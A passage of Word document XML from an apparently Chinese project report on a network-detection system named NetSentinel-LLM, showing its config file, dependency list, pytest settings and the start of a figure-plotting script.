          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">  max_retries: 2</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="400A92DE">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">  max_tokens: 1500</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E7B8A9E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3B68F2E0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>rag:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07B3B9E7">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">  # 知识库规模只有十几条中文段落，查询词是固定的类别名 + 特征名。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F4BF4C7">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">  # 这个量级下字符二元组 BM25 与向量检索效果相当，却少一个 torch 依赖、少一个失效点。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E1D27A5">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">  # 要换成向量库时只改 llm/rag.py，接口 retrieve(query, top_k) 不变。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33C936B5">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">  backend: bm25</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="125B4360">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">  chunks_path: data/rag/chunks.json</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0360FD14">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">  top_k: 3</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="263EC215">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5DFA92C7">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>dashboard:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7675875D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">  center_url: http://127.0.0.1:8000</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26621007">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">  refresh_interval: 2.0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2000D360">
      <w:pPr>
        <w:spacing w:before="0" w:after="160"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="70DA1468">
      <w:pPr>
        <w:keepNext/>
        <w:spacing w:before="160" w:after="40"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>代码 3-3　requirements.txt</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>（19 行）</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5573594A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>scapy&gt;=2.5.0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="500CBEB8">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>pandas&gt;=2.0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CF0E7DA">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>numpy&gt;=1.24</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="633A0752">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>scikit-learn&gt;=1.3</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="335E4F2A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>xgboost&gt;=2.0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3AEA8E3A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>lightgbm&gt;=4.0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B4F9323">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>catboost&gt;=1.2</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6ECCA425">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>fastapi&gt;=0.110</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0101D188">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>uvicorn[standard]&gt;=0.27</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F7FF571">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>pydantic&gt;=2.5</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42FD468B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>httpx&gt;=0.26</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40117ACC">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>python-multipart&gt;=0.0.9</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34BEDE1A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>pyyaml&gt;=6.0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="060BD835">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>streamlit&gt;=1.32</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59356A3F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>plotly&gt;=5.18</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B1CE889">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>matplotlib&gt;=3.7</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E0BF2F5">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>faiss-cpu&gt;=1.7</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C9FDAB9">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>sentence-transformers&gt;=2.5</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26B33604">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>pytest&gt;=8.0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="449A0580">
      <w:pPr>
        <w:spacing w:before="0" w:after="160"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0C8CFBF9">
      <w:pPr>
        <w:keepNext/>
        <w:spacing w:before="160" w:after="40"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>代码 3-4　pytest.ini</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>（5 行）　关掉与本机 io 插件冲突的 anyio 插件</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28E18D3B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>[pytest]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EB5E587">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>testpaths = tests</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32BB75BC">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t># 本机 io 插件的 pytest 插件要求 pytest&gt;=8，与系统自带的旧 pytest 冲突，</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3284BCD1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t># 在插件自动加载阶段就炸。这里显式关掉它，避免一条用例都跑不起来。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03B94C90">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>addopts = -p no:anyio</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2805EB32">
      <w:pPr>
        <w:spacing w:before="0" w:after="160"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="348D9A8D">
      <w:pPr>
        <w:keepNext/>
        <w:spacing w:before="160" w:after="40"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>代码 3-5　docs/make_figures.py</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>（343 行）　四张设计图的生成脚本</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F81E5B9">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>#!/usr/bin/env python3</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5068BEAB">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t># -*- coding: utf-8 -*-</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6EBEB38E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>"""NetSentinel-LLM 报告插图生成脚本。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C059803">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="284605CA">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>用法：python3 docs/make_figures.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E99C94F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>产出：docs/figures/*.png（300 dpi）</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3BD6E54C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6D558225">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>★ 尺寸约定：报告版心宽 15.2 cm（约 6.3 in）。图按 figsize 宽 8.4 in 出，</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DD06EA4">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">  放进 Word 时缩到 0.75 倍，图内 8.6 pt 字号实际印出来约 6.4 pt。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B13BE9C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">  调大 figsize 会让字号跟着缩水，改布局后请按"有效字号 = 字号 × 6.3 / figsize宽"复核。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4EF85DA0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>"""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5891D100">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>from pathlib import Path</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62E2077E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6340D435">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>import matplotlib</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0FE163C0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="40F1BCE6">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>matplotlib.use("Agg")  # 必须在 import pyplot 之前，见 matplotlib-qtagg-cv2-crash</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2091F4F2">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="22EA8F1E">
      <w:pPr>
